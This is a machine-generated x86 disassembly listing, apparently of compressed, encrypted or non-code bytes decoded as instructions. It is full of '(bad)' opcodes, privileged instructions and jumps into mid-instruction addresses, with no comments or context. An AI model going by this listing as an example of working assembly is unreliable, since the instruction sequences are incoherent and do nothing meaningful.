  40fb33:	imul   eax,DWORD PTR [ecx-0x4c52476],0x45
  40fb3a:	inc    ebp
  40fb3b:	mov    dh,0xbf
  40fb3d:	int3   
  40fb3e:	jl     0x40faec
  40fb40:	inc    ebp
  40fb41:	retf   0x49a7
  40fb44:	dec    edx
  40fb45:	loope  0x40fad2
  40fb47:	mov    fs,ecx
  40fb49:	push   esp
  40fb4a:	leave  
  40fb4b:	sbb    al,0x2b
  40fb4d:	cli    
  40fb4e:	iret   
  40fb4f:	dec    BYTE PTR [esi]
  40fb51:	dec    esp
  40fb52:	sbb    dh,BYTE PTR [ebp-0x31]
  40fb55:	mov    eax,0xc342be02
  40fb5a:	sbb    al,0x87
  40fb5c:	pushf  
  40fb5d:	cmp    eax,0x21602ca5
  40fb62:	push   0x4553bb23
  40fb67:	aaa    
  40fb68:	sub    edi,DWORD PTR [edi]
  40fb6a:	jle    0x40fb54
  40fb6c:	dec    esi
  40fb6d:	aad    0x27
  40fb6f:	daa    
  40fb70:	inc    esi
  40fb71:	adc    al,0x26
  40fb73:	adc    eax,0x18d3be16
  40fb78:	(bad)  
  40fb79:	or     edi,edx
  40fb7b:	push   ss
  40fb7c:	or     eax,0x1e64e8be
  40fb81:	mov    eax,ds:0x58417741
  40fb86:	sub    esp,DWORD PTR [edx+0x12f3903a]
  40fb8c:	je     0x40fbc4
  40fb8e:	movntq QWORD PTR [eax+eax*4-0x3a],mm7
  40fb93:	push   cs
  40fb94:	cmp    eax,0xf63fe55e
  40fb99:	repz sti 
  40fb9b:	mov    DWORD PTR [edi+0x33],ebp
  40fb9e:	pusha  
  40fb9f:	or     ah,BYTE PTR [ebx]
  40fba1:	ins    DWORD PTR es:[edi],dx
  40fba2:	mov    ebx,0xb6b3078c
  40fba7:	jb     0x40fbb7
  40fba9:	and    eax,0xb9c5e00c
  40fbae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbaf:	popa   
  40fbb0:	or     ah,ch
  40fbb2:	js     0x40fbbb
  40fbb4:	shl    ch,0xa9
  40fbb7:	gs mov bl,ch
  40fbba:	mov    gs,WORD PTR [eax+eiz*4]
  40fbbd:	dec    esi
  40fbbe:	mov    dh,0x52
  40fbc0:	cwde   
  40fbc1:	jecxz  0x40fba7
  40fbc3:	rcl    DWORD PTR [eax+0x47],cl
  40fbc6:	aam    0x74
  40fbc8:	dec    ecx
  40fbc9:	or     eax,DWORD PTR [ebp-0x5cab25c6]
  40fbcf:	xchg   ebx,eax
  40fbd0:	ins    DWORD PTR es:[edi],dx
  40fbd1:	mov    edi,0x903ccd17
  40fbd6:	pop    esi
  40fbd7:	loopne 0x40fb97
  40fbd9:	mov    bl,0xd1
  40fbdb:	jne    0x40fc23
  40fbdd:	dec    esi
  40fbde:	mov    ebx,edi
  40fbe0:	fwait
  40fbe1:	push   ebx
  40fbe2:	pop    ebp
  40fbe3:	int    0x9
  40fbe5:	push   eax
  40fbe6:	dec    eax
  40fbe7:	pop    ecx
  40fbe8:	ficom  DWORD PTR [ecx]
  40fbea:	popa   
  40fbeb:	inc    esp
  40fbec:	test   eax,0xa050a87d
  40fbf1:	out    0x94,al
  40fbf3:	fimul  DWORD PTR [esp+edx*2+0x12bc5546]
  40fbfa:	or     DWORD PTR [edx-0x323021c1],esp
  40fc00:	xchg   esp,eax
  40fc01:	add    DWORD PTR [edx-0x59],ebp
  40fc04:	xchg   edx,eax
  40fc05:	or     al,0x3b
  40fc07:	ret    
  40fc08:	scas   eax,DWORD PTR es:[edi]
  40fc09:	es pop ss
  40fc0b:	adc    eax,DWORD PTR ds:0x86e552eb
  40fc11:	out    dx,al
  40fc12:	stos   BYTE PTR es:[edi],al
  40fc13:	icebp  
  40fc14:	sub    DWORD PTR [edi-0x6],ebx
  40fc17:	or     edx,eax
  40fc19:	and    al,ah
  40fc1b:	hlt    
  40fc1c:	add    al,0xcf
  40fc1e:	cmc    
  40fc1f:	push   ebp
  40fc20:	je     0x40fc2e
  40fc22:	jl     0x40fbce
  40fc24:	pop    esp
  40fc25:	ss push ss
  40fc27:	xchg   BYTE PTR [eax],bl
  40fc29:	jg     0x40fc9e
  40fc2b:	fild   DWORD PTR [edx-0x6c82f0f2]
  40fc31:	and    dh,BYTE PTR [edi+edx*4-0x4d713a75]
  40fc38:	mov    cl,0xc8
  40fc3a:	out    dx,al
  40fc3b:	xchg   DWORD PTR [eax+0x14a2dbad],edx
  40fc41:	mov    ah,0x8
  40fc43:	(bad)
  40fc46:	ret    
  40fc47:	xchg   edi,eax
  40fc48:	rol    ch,1
  40fc4a:	ins    BYTE PTR es:[edi],dx
  40fc4b:	fsubr  DWORD PTR [ebp+0x43]
  40fc4e:	pop    esp
  40fc4f:	out    dx,al
  40fc50:	dec    ebp
  40fc51:	repnz xlat BYTE PTR ds:[ebx]
  40fc53:	retfw  0x9545
  40fc57:	daa    
  40fc58:	(bad)  
  40fc59:	push   eax
  40fc5a:	push   es
  40fc5b:	and    eax,ebx
  40fc5d:	mov    edx,0x18a78011
  40fc62:	jmp    0x40fc05
  40fc64:	int    0x68
  40fc66:	lods   al,BYTE PTR ds:[esi]
  40fc67:	sbb    DWORD PTR [ebp+0x30],edi
  40fc6a:	push   edx
  40fc6b:	data16 lods al,BYTE PTR ds:[esi]
  40fc6d:	popa   
  40fc6e:	push   cs
  40fc6f:	xor    BYTE PTR [esi-0x1e02934],ah
  40fc75:	xchg   esi,eax
  40fc76:	pop    ecx
  40fc77:	cdq    
  40fc78:	push   edx
  40fc79:	adc    edi,DWORD PTR [edi]
  40fc7b:	xchg   esp,eax
  40fc7c:	cld    
  40fc7d:	popa   
  40fc7e:	test   eax,0x466fe9d5
  40fc83:	dec    ebx
  40fc84:	mov    ds:0x6db3f69c,al
  40fc89:	std    
  40fc8a:	adc    dl,BYTE PTR [eax]
  40fc8c:	ja     0x40fc9e
  40fc8e:	push   ds
  40fc8f:	jb     0x40fc9f
  40fc91:	shl    DWORD PTR [eax],0xb7
  40fc94:	int    0x65
  40fc96:	fiadd  WORD PTR [edi]
  40fc98:	push   edx
  40fc99:	stos   BYTE PTR es:[edi],al
  40fc9a:	lea    esi,[ecx+0x6c]
  40fc9d:	xchg   edx,eax
  40fc9e:	scas   eax,DWORD PTR es:[edi]
  40fc9f:	xchg   ebp,eax
  40fca0:	or     eax,0x79738aae
  40fca5:	mov    BYTE PTR [ebx+edx*4+0x5d],ch
  40fca9:	sub    BYTE PTR [ecx-0x1f],ch
  40fcac:	stos   DWORD PTR es:[edi],eax
  40fcad:	add    ebx,DWORD PTR [ecx+0x64]
  40fcb0:	retf   
  40fcb1:	or     BYTE PTR [ecx],ch
  40fcb3:	or     DWORD PTR [ebx],edx
  40fcb5:	xchg   ebp,eax
  40fcb6:	cdq    
  40fcb7:	sbb    al,0x56
  40fcb9:	movsx  esp,WORD PTR [eax+0x1e666fc]
  40fcc0:	jecxz  0x40fc6a
  40fcc2:	arpl   WORD PTR ds:0x2b165023,si
  40fcc8:	mov    ah,0xe5
  40fcca:	cmp    BYTE PTR [esi],bh
  40fccc:	pop    esp
  40fccd:	enter  0xf103,0x3
  40fcd1:	shr    ecx,0xca
  40fcd4:	add    al,BYTE PTR [eax]
  40fcd6:	add    al,dh
  40fcd8:	sub    DWORD PTR [ebx-0x20],esp
  40fcdb:	arpl   WORD PTR [eax+0x71],si
  40fcde:	sub    ebp,esi
  40fce0:	scas   eax,DWORD PTR es:[edi]
  40fce1:	ret    
  40fce2:	sar    DWORD PTR [edi-0x46def1b1],0xb3
  40fce9:	jle    0x40fd69
  40fceb:	lods   al,BYTE PTR ds:[esi]
  40fcec:	jl     0x40fd6c
  40fcee:	jle    0x40fd46
  40fcf0:	jl     0x40fcda
  40fcf2:	sub    DWORD PTR [edi-0x3bdef0f4],esp
  40fcf8:	mov    esp,0x9f84459d
  40fcfd:	ret    0x27f5
  40fd00:	aad    0xfb
  40fd02:	retf   0x92e9
  40fd05:	retf   
  40fd06:	rcr    BYTE PTR [ebp-0x58806879],0x94
  40fd0d:	xlat   BYTE PTR ds:[ebx]
  40fd0e:	nop
  40fd0f:	pop    esp
  40fd10:	jns    0x40fd53
  40fd12:	push   eax
  40fd13:	or     eax,0xdf5818e9
  40fd18:	scas   al,BYTE PTR es:[edi]
  40fd19:	das    
  40fd1a:	mov    bl,0x2a
  40fd1c:	and    al,0xbc
  40fd1e:	stc    
  40fd1f:	loope  0x40fcb7
  40fd21:	aaa    
  40fd22:	jmp    0x40fd2f
  40fd24:	mov    ch,0x41
  40fd26:	fstp   TBYTE PTR ds:0x976978c3
  40fd2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd2d:	in     al,dx
  40fd2e:	pop    es
  40fd2f:	adc    eax,0x35402c0a
  40fd34:	loop   0x40fcc6
  40fd36:	and    bl,BYTE PTR [edi+0x21]
  40fd39:	mov    ah,0x70
  40fd3b:	push   edx
  40fd3c:	sbb    BYTE PTR [ebp-0x5b294005],dl
  40fd42:	jb     0x40fce5
  40fd44:	dec    ebx
  40fd45:	cdq    
  40fd46:	je     0x40fcde
  40fd48:	push   ebx
  40fd49:	push   0xffffffe5
  40fd4b:	adc    eax,0xf3bf5e98
  40fd50:	(bad)  
  40fd51:	and    dh,BYTE PTR [ebx+eax*2-0x5c]
  40fd55:	sub    DWORD PTR [ebp-0x57],ecx
  40fd58:	adc    DWORD PTR ds:0xd3949417,0x2e
  40fd5f:	or     BYTE PTR [ecx+0x39a5fee4],0x42
  40fd66:	bound  ecx,QWORD PTR [edi+0xd1c8f49]
  40fd6c:	jle    0x40fd26
  40fd6e:	add    DWORD PTR [esi+0x42671182],edx
  40fd74:	btr    DWORD PTR [edx],ebx
  40fd77:	ret    
  40fd78:	jnp    0x40fcfb
  40fd7a:	(bad)  
  40fd7b:	dec    esp
  40fd7c:	cmp    DWORD PTR [edi],0xbca88db5
  40fd82:	int3   
  40fd83:	shl    DWORD PTR [ebx],cl
  40fd85:	pop    esi
  40fd86:	in     eax,0xa8
  40fd88:	icebp  
  40fd89:	shl    DWORD PTR [eax],1
  40fd8b:	jb     0x40fdfb
  40fd8d:	xchg   edx,eax
  40fd8e:	xchg   BYTE PTR [edx-0x2],dh
  40fd91:	fild   QWORD PTR [esi-0x70bee464]
  40fd97:	inc    edx
  40fd98:	jne    0x40fde9
  40fd9a:	jmp    0x5a91e37e
  40fd9f:	loope  0x40fe1e
  40fda1:	ss dec esp
  40fda3:	jb     0x40fdc6
  40fda5:	fs popf 
  40fda7:	loopne 0x40fe0e
  40fda9:	cmc    
  40fdaa:	push   eax
  40fdab:	mov    bl,0x93
  40fdad:	je     0x40fdd3
  40fdaf:	and    edx,edx
  40fdb1:	push   esp
  40fdb2:	lock in al,dx
  40fdb4:	jb     0x40fdd2
  40fdb6:	jae    0x40fdac
  40fdb8:	and    DWORD PTR [edi],ecx
  40fdba:	(bad)  
  40fdbb:	mov    dl,0xaf
  40fdbd:	and    ah,BYTE PTR [eax+0x13]
  40fdc0:	repnz imul cl
  40fdc3:	addr16 cmp esp,esp
  40fdc6:	pop    ebx
  40fdc7:	sbb    DWORD PTR [ebx+0x4e200a8d],edi
  40fdcd:	push   ebx
  40fdce:	aaa    
  40fdcf:	pop    es
  40fdd0:	push   0x60780ee3
  40fdd5:	push   edi
  40fdd6:	sbb    al,0xd7
  40fdd8:	ins    DWORD PTR es:[edi],dx
  40fdd9:	jge    0x40fda8
  40fddb:	cdq    
  40fddc:	test   al,0xc2
  40fdde:	or     eax,0x209cdf
  40fde3:	xchg   esi,eax
  40fde4:	add    dl,BYTE PTR [esi-0x40]
  40fde7:	out    dx,al
  40fde8:	outs   dx,BYTE PTR ds:[esi]
  40fde9:	xor    ah,BYTE PTR [ebp-0x6a]
  40fdec:	or     ebx,edi
  40fdee:	pusha  
  40fdef:	add    DWORD PTR [ebx-0x80b13e],eax
  40fdf5:	push   0x46ae0779
  40fdfa:	call   0xf34cc897
  40fdff:	fisub  WORD PTR [ebp+0x1bbe2b77]
  40fe05:	ins    DWORD PTR es:[edi],dx
  40fe06:	test   al,0xc4
  40fe08:	xor    BYTE PTR [ebp-0x45],dh
  40fe0b:	shr    DWORD PTR [edx],1
  40fe0d:	cmp    al,0x5
  40fe0f:	jle    0x40fdf2
  40fe11:	pop    ecx
  40fe12:	test   al,0x3d
  40fe14:	mov    dl,0xe3
  40fe16:	xor    BYTE PTR [edx+edi*2+0x65],cl
  40fe1a:	repz sbb BYTE PTR [edi-0x9],ch
  40fe1e:	clc    
  40fe1f:	aam    0xf9
  40fe21:	sub    BYTE PTR [ebx+0x760f0e1e],dl
  40fe27:	int    0x37
  40fe29:	scas   eax,DWORD PTR es:[edi]
  40fe2a:	ins    BYTE PTR es:[di],dx
  40fe2c:	arpl   WORD PTR [ebx],bp
  40fe2e:	fist   DWORD PTR [ebx]
  40fe30:	push   esp
  40fe31:	inc    edi
  40fe32:	and    eax,0x653e68b
  40fe37:	getsec 
  40fe39:	xchg   cl,cl
  40fe3b:	test   cl,dh
  40fe3d:	aam    0x6d
  40fe3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe40:	imul   ebx,esp,0x950bc353
  40fe46:	dec    edx
  40fe47:	inc    edi
  40fe48:	or     edx,DWORD PTR [ebp-0x18]
  40fe4b:	xlat   BYTE PTR ds:[ebx]
  40fe4c:	push   0x7
  40fe4e:	sbb    eax,0x942c189e
  40fe53:	stos   DWORD PTR es:[edi],eax
  40fe54:	rep outs dx,DWORD PTR ds:[esi]
  40fe56:	scas   al,BYTE PTR es:[edi]
  40fe57:	stos   DWORD PTR es:[edi],eax
  40fe58:	jecxz  0x40fe78
  40fe5a:	scas   al,BYTE PTR es:[edi]
  40fe5b:	(bad)  
  40fe5c:	cmp    ebp,DWORD PTR [edx+0x32]
  40fe5f:	cmp    al,0xf1
  40fe61:	fsin   
  40fe63:	jbe    0x40fe87
  40fe65:	pop    ds
  40fe66:	ret    
  40fe67:	xchg   ebp,eax
  40fe68:	and    al,0xbe
  40fe6a:	xor    eax,esp
  40fe6c:	jns    0x40fe02
  40fe6e:	call   0x951d:0xfe74688
  40fe75:	loop   0x40fe0b
  40fe77:	arpl   WORD PTR [ecx-0x4c0032ef],ax
  40fe7d:	ins    BYTE PTR es:[edi],dx
  40fe7e:	adc    eax,0xa234d629
  40fe83:	cmovb  eax,DWORD PTR [eax]
  40fe86:	push   esp
  40fe87:	mov    al,0x66
  40fe89:	and    al,0x3e
  40fe8b:	ja     0x40fe12
  40fe8d:	xchg   edx,eax
  40fe8e:	hlt    
  40fe8f:	mov    bl,0xac
  40fe91:	(bad)  
  40fe92:	sahf   
  40fe93:	das    
  40fe94:	leave  
  40fe95:	push   esi
  40fe96:	repz ret 0xbe92
  40fe9a:	dec    ebx
  40fe9b:	ret    
  40fe9c:	fimul  DWORD PTR [ebx+eax*4+0x56733eae]
  40fea3:	or     edx,DWORD PTR [esi]
  40fea5:	loopne 0x40fec6
  40fea7:	jecxz  0x40fe29
  40fea9:	nop
  40feaa:	aam    0xce
  40feac:	and    dl,BYTE PTR [edx+0x3a]
  40feaf:	lahf   
  40feb0:	(bad)  
  40feb1:	or     eax,DWORD PTR [ebx]
  40feb3:	mov    esp,0xfdd4fe83
  40feb8:	mov    DWORD PTR [edi+0x14e17447],ebx
  40febe:	xor    al,0xdf
  40fec0:	popf   
  40fec1:	lahf   
  40fec2:	out    dx,al
  40fec3:	popa   
  40fec4:	stc    
  40fec5:	(bad)  
  40fec6:	cld    
  40fec7:	rol    DWORD PTR [ebp-0x369a8247],cl
  40fecd:	xchg   esp,eax
  40fece:	rol    BYTE PTR [ebp+0x63],cl
  40fed1:	sti    
  40fed2:	loope  0x40feae
  40fed4:	cmp    bl,BYTE PTR [ebx-0xd996113]
  40feda:	xchg   ecx,eax
  40fedb:	cmp    BYTE PTR [esi],bh
  40fedd:	inc    esp
  40fede:	inc    ecx
  40fedf:	cdq    
  40fee0:	lock ds xchg esi,eax
  40fee3:	jno    0x40fe94
  40fee5:	push   edx
  40fee6:	mov    edx,0xfe032602
  40feeb:	imul   esp,DWORD PTR [edi-0x3],0x11bf1a1e
  40fef2:	push   ss
  40fef3:	dec    ebp
  40fef4:	add    al,0xb8
  40fef6:	mov    bl,0x5e
  40fef8:	scas   eax,DWORD PTR es:[edi]
  40fef9:	jae    0x40ff55
  40fefb:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40fefd:	mov    al,ds:0xe4796df1
  40ff02:	or     BYTE PTR [ecx+0x6b],bh
  40ff05:	int3   
  40ff06:	leave  
  40ff07:	and    BYTE PTR [ecx],bh
  40ff09:	(bad)  
  40ff0a:	mov    dl,0x4
  40ff0c:	sbb    DWORD PTR [ebp-0x7ff534ea],esi
  40ff12:	fild   DWORD PTR [ecx-0x13]
  40ff15:	lods   al,BYTE PTR ds:[esi]
  40ff16:	sub    DWORD PTR [ebx],edx
  40ff18:	mov    bl,0x59
  40ff1a:	mov    al,0xcc
  40ff1c:	call   DWORD PTR [ecx+0x1b2c81be]
  40ff22:	adc    al,BYTE PTR [esi-0x1e]
  40ff25:	call   0x126f1851
  40ff2a:	outs   dx,DWORD PTR ds:[esi]
  40ff2b:	cli    
  40ff2c:	je     0x40ffa8
  40ff2e:	sahf   
  40ff2f:	out    0x3b,eax
  40ff31:	into   
  40ff32:	retf   
  40ff33:	ds push es
  40ff35:	iret   
  40ff36:	xchg   edx,eax
  40ff37:	lock xchg ecx,eax
  40ff39:	aad    0xdf
  40ff3b:	icebp  
  40ff3c:	lods   al,BYTE PTR ds:[esi]
  40ff3d:	test   esp,esp
  40ff3f:	fs dec edi
  40ff41:	jb     0x40ff2a
  40ff43:	loope  0x40fef5
  40ff45:	arpl   WORD PTR [eax],sp
  40ff47:	pop    ebx
  40ff48:	mov    ah,ch
  40ff4a:	es retf 
  40ff4c:	push   0xb48460cb
  40ff51:	adc    eax,0xc0b5150f
  40ff56:	outs   dx,BYTE PTR ds:[esi]
  40ff57:	mov    edi,0x13503e76
  40ff5c:	xchg   ecx,eax
  40ff5d:	push   DWORD PTR [edx+0x7b6efcb3]
  40ff63:	test   al,0xfe
  40ff65:	outs   dx,BYTE PTR ds:[esi]
  40ff66:	test   al,0x92
  40ff68:	loope  0x40ffde
  40ff6a:	mov    edx,0xd964552b
  40ff6f:	aad    0x14
  40ff71:	not    DWORD PTR [ecx+0x74]
  40ff74:	mov    dh,0x90
  40ff76:	lea    esi,[ebx]
  40ff78:	or     eax,0x5c15920c
  40ff7d:	sbb    eax,0x4d192ade
  40ff82:	or     bl,BYTE PTR [esp+ecx*1-0x1536cdcf]
  40ff89:	push   ebp
  40ff8a:	stc    
  40ff8b:	popa   
  40ff8c:	fcom   st(7)
  40ff8e:	popf   
  40ff8f:	imul   ecx,DWORD PTR cs:[edi-0x2c1fd36f],0x175f004e
  40ff9a:	test   DWORD PTR [ecx+0x32],0x7f898fbe
  40ffa1:	imul   eax,esi
  40ffa4:	mov    esi,DWORD PTR [ebp+0xc]
  40ffa7:	mov    DWORD PTR ds:0x433723,0x6048
  40ffb1:	cmp    esi,eax
  40ffb3:	jne    0x4102bc
  40ffb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ffbc:	sbb    DWORD PTR ds:0x4337e7,0x14e6
  40ffc6:	jmp    0x410295
  40ffcb:	inc    eax
  40ffcc:	sbb    BYTE PTR [esi+0x407076f6],dh
  40ffd2:	test   al,0x4a
  40ffd4:	add    eax,0x135239b1
  40ffd9:	dec    ecx
  40ffda:	and    esi,edi
  40ffdc:	mov    esi,0x7cac7e7e
  40ffe1:	jle    0x410061
  40ffe3:	jl     0x40ff85
  40ffe5:	jge    0x40ff82
  40ffe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffe8:	mov    DWORD PTR [edx-0x35],esp
  40ffeb:	loope  0x40ffc9
  40ffed:	aas    
  40ffee:	sub    ah,BYTE PTR [esi]
  40fff0:	push   esp
  40fff1:	test   DWORD PTR [ebp+edx*8-0x75ed94ae],edx
  40fff8:	lahf   
  40fff9:	mov    WORD PTR [ebx],?
  40fffb:	sub    DWORD PTR [ebx-0x133ff604],edx
  410001:	and    eax,esi
  410003:	add    BYTE PTR [esp+esi*8-0x61],ah
  410007:	dec    edx
  410008:	rcl    DWORD PTR ds:0x8f69b77d,0x4
  41000f:	or     al,0x2a
  410011:	rol    DWORD PTR [ebp+0x3f],1
  410014:	or     esi,esp
  410016:	mov    BYTE PTR [ebx+0x67],bl
  410019:	icebp  
  41001a:	sahf   
  41001b:	out    0x9c,al
  41001d:	lock int3 
  41001f:	pop    esp
  410020:	inc    eax
  410021:	(bad)  [edi+esi*4+0x49505044]
  410028:	pop    edi
  410029:	ret    
  41002a:	cmp    esp,0x6e
  41002d:	push   es
  41002e:	clc    
  41002f:	or     eax,DWORD PTR [ebx-0x5a]
  410032:	sbb    al,0x5d
  410034:	inc    esp
  410035:	sbb    BYTE PTR [ecx+0x27],ah
  410038:	dec    edx
  410039:	stos   DWORD PTR es:[edi],eax
  41003a:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41003c:	shl    BYTE PTR [ecx],0x18
  41003f:	inc    eax
  410040:	idiv   cl
  410042:	add    eax,DWORD PTR [ecx+0x49]
  410045:	ret    
  410046:	mov    ebp,0x51a7051f
  41004b:	inc    edi
  41004c:	popf   
  41004d:	mov    bh,0x7b
  41004f:	rcl    DWORD PTR [esi],cl
  410051:	or     al,0x20
  410053:	pop    edx
  410054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410055:	outs   dx,DWORD PTR ds:[esi]
  410056:	pop    esp
  410057:	shl    BYTE PTR [ebx+0x36e8c112],1
  41005d:	pop    ds
  41005e:	stos   DWORD PTR es:[edi],eax
  41005f:	ins    BYTE PTR es:[edi],dx
  410060:	(bad)  
  410061:	inc    BYTE PTR [eax]
  410063:	das    
  410064:	mov    edi,0x70b3e532
  410069:	mov    ebx,0xf820a729
  41006e:	cwde   
  41006f:	xchg   ecx,eax
  410070:	les    edi,FWORD PTR [edi]
  410072:	test   al,0x71
  410075:	test   al,0x7f
  410077:	sti    
  410078:	add    BYTE PTR [eax],dl
  41007a:	std    
  41007b:	push   eax
  41007c:	test   al,0x64
  41007e:	adc    esi,DWORD PTR [edx+ebx*2]
  410081:	mov    eax,0x724a6f7a
  410086:	cmp    al,BYTE PTR [ecx]
  410088:	std    
  410089:	dec    ebp
  41008a:	xchg   BYTE PTR [esi+0x76165630],dl
  410090:	into   
  410091:	loop   0x41005b
  410093:	sub    esi,DWORD PTR [ebx+ecx*1]
  410096:	jbe    0x410046
  410098:	cmp    DWORD PTR [ecx-0x68516c58],eax
  41009e:	and    DWORD PTR [eax+0x38],edx
  4100a1:	cld    
  4100a2:	icebp  
  4100a3:	push   ss
  4100a4:	mov    edx,0x5e73a2cc
  4100a9:	mov    edx,0x9ea1623
  4100ae:	pop    eax
  4100af:	adc    eax,0xc8e088a8
  4100b4:	repnz or al,0xbf
  4100b7:	xchg   ebp,eax
  4100b8:	sbb    eax,0x4ad5c175
  4100bd:	or     eax,0x1748e70c
  4100c2:	stos   BYTE PTR es:[edi],al
  4100c3:	inc    ebp
  4100c4:	aaa    
  4100c5:	test   eax,0x25308c92
  4100ca:	aam    0xaa
  4100cc:	and    al,0x99
  4100ce:	mov    WORD PTR [ebp-0x53d17e62],ds
  4100d4:	outs   dx,DWORD PTR ds:[esi]
  4100d5:	lea    ecx,[edx+ebp*8-0x59]
  4100d9:	jg     0x41011d
  4100db:	jle    0x410151
  4100dd:	inc    ebp
  4100de:	sti    
  4100df:	dec    ebp
  4100e0:	jg     0x410093
  4100e2:	pusha  
  4100e3:	mov    dh,0x45
  4100e5:	mov    edi,0x3c298218
  4100ea:	ret    
  4100eb:	or     BYTE PTR [esi-0x1918fd21],0xd9
  4100f2:	dec    ecx
  4100f3:	out    dx,al
  4100f4:	data16 gs or dh,al
  4100f8:	or     ebx,DWORD PTR [ebx]
  4100fa:	in     eax,0x59
  4100fc:	push   edx
  4100fd:	mov    ecx,0x98ac546c
  410102:	out    0x8c,al
  410104:	sub    ch,bh
  410106:	or     al,0x24
  410108:	jb     0x4100de
  41010a:	std    
  41010b:	push   ecx
  41010c:	cmp    dh,BYTE PTR [edx+0x2947cc8b]
  410112:	or     al,0x8c
  410114:	add    DWORD PTR [ebx],ebp
  410116:	imul   edi,edx,0x71
  410119:	mov    ecx,0x85772bc5
  41011e:	rcr    DWORD PTR [eax-0x5c],cl
  410121:	sub    al,0xc3
  410123:	js     0x41010f
  410125:	aas    
  410126:	sub    ebp,DWORD PTR [esi-0x76]
  410129:	in     al,0xac
  41012b:	mov    edx,0x96022cc1
  410130:	pop    esp
  410131:	pop    ecx
  410132:	test   BYTE PTR [edx-0x53],dl
  410135:	push   cs
  410136:	loopne 0x410161
  410138:	jbe    0x4101b2
  41013a:	gs xchg ebx,eax
  41013c:	mov    cs,edi
  41013e:	jmp    0x41018d
  410140:	mov    edi,0x2ca54ffb
  410145:	and    al,0x5f
  410147:	popf   
  410148:	jecxz  0x410113
  41014a:	push   es
  41014b:	mov    DWORD PTR [edi-0x55],esp
  41014e:	cmp    al,ch
  410150:	and    DWORD PTR [ecx],edx
  410152:	adc    eax,0x90da2d28
  410157:	xchg   esp,eax
  410158:	cwde   
  410159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41015a:	sbb    cl,cl
  41015c:	fs or  eax,0xffffffa5
  410160:	cdq    
  410161:	xor    ebx,DWORD PTR [esi-0x1bb6a692]
  410167:	and    eax,0xd4f7f121
  41016c:	push   0xcfb88295
  410171:	xchg   esi,eax
  410172:	ror    DWORD PTR [edi],cl
  410174:	fmul   DWORD PTR [edx+0x67a944ad]
  41017a:	idiv   BYTE PTR [esi+0x5b]
  41017d:	loope  0x410125
  41017f:	adc    al,ah
  410181:	mov    cl,0xe6
  410183:	jl     0x4101b0
  410185:	inc    ebp
  410186:	ins    BYTE PTR es:[edi],dx
  410187:	sub    esi,DWORD PTR [edi]
  410189:	mov    ds:0xe34eeb69,eax
  41018e:	test   DWORD PTR [ecx+ebp*1],edi
  410191:	push   ecx
  410192:	rcr    DWORD PTR cs:[ecx],0xe9
  410196:	pusha  
  410197:	xchg   edi,eax
  410198:	imul   esp,DWORD PTR [edx],0xfffffffd
  41019b:	mov    ch,0x0
  41019d:	gs add al,0xd7
  4101a0:	clc    
  4101a1:	sub    dl,BYTE PTR [edx+eiz*8]
  4101a4:	rol    eax,1
  4101a6:	adc    ch,cl
  4101a8:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101aa:	xchg   cl,cl
  4101ac:	fs repnz push cs
  4101af:	mov    edx,0x9fafd3fa
  4101b4:	adc    eax,0xf4bbb5e
  4101b9:	jge    0x41022a
  4101bb:	adc    al,0xf
  4101bd:	pushf  
  4101be:	loope  0x41023c
  4101c0:	xor    BYTE PTR [eax],al
  4101c2:	mov    esp,DWORD PTR [esi+0x6]
  4101c5:	rol    DWORD PTR [edi-0x177fe200],cl
  4101cb:	in     eax,dx
  4101cc:	mov    edi,ebx
  4101ce:	xor    ch,ah
  4101d0:	out    0x9b,al
  4101d2:	rcr    dl,1
  4101d4:	jne    0x41019d
  4101d6:	pop    eax
  4101d7:	scas   eax,DWORD PTR es:[edi]
  4101d8:	mov    ebx,0x29b215cc
  4101dd:	(bad)  
  4101de:	mov    ebx,0x1c6e4fbc
  4101e3:	rcr    DWORD PTR [ecx-0x1f468b59],1
  4101e9:	hlt    
  4101ea:	jp     0x410203
  4101ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101ed:	fdivr  QWORD PTR [eax-0x3c]
  4101f0:	mov    al,0x2c
  4101f2:	jno    0x41021e
  4101f4:	inc    esi
  4101f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101f6:	scas   al,BYTE PTR es:[edi]
  4101f7:	ins    BYTE PTR es:[edi],dx
  4101f8:	inc    ebx
  4101f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101fa:	sbb    ecx,edx
  4101fc:	cli    
  4101fd:	or     ah,BYTE PTR [edx+0x43]
  410200:	ins    BYTE PTR es:[edi],dx
  410201:	jmp    0x4101fe
  410203:	mov    edx,0x171ee4ad
  410208:	and    al,0x8f
  41020a:	mov    ds:0x72913cf3,al
  41020f:	stc    
  410210:	cwde   
  410211:	cld    
  410212:	aad    0x8c
  410214:	stos   BYTE PTR es:[edi],al
  410215:	xchg   esp,eax
  410216:	pop    esi
  410217:	mov    dl,0xb9
  410219:	loopne 0x4101a1
  41021b:	xchg   edx,eax
  41021c:	mov    eax,ds:0x12cb10c4
  410221:	adc    eax,0xa47bcc09
  410226:	dec    edx
  410227:	test   BYTE PTR [ecx-0x31c7688d],al
  41022d:	mov    esp,0xd9e4ef30
  410232:	fwait
  410233:	cmp    BYTE PTR [eax-0x59],cl
  410236:	mov    cl,0x6e
  410238:	dec    esp
  410239:	xchg   ebx,eax
  41023a:	bound  esp,QWORD PTR [edi+0x44da6d0]
  410240:	xlat   BYTE PTR ds:[ebx]
  410241:	test   ebp,esi
  410243:	mov    cl,0x7b
  410245:	adc    ebx,esp
  410247:	mov    ebp,DWORD PTR ds:0x3f145b0
  41024d:	dec    ecx
  41024e:	push   esi
  41024f:	mov    al,0x13
  410251:	(bad)  
  410252:	rcl    edi,cl
  410254:	sahf   
  410255:	fwait
  410256:	or     BYTE PTR [ebx+edx*4+0x13],0xd4
  41025b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41025c:	push   cs
  41025d:	mov    ebp,0x3d9b925f
  410262:	(bad)  
  410263:	(bad)  
  410264:	aaa    
  410265:	arpl   si,cx
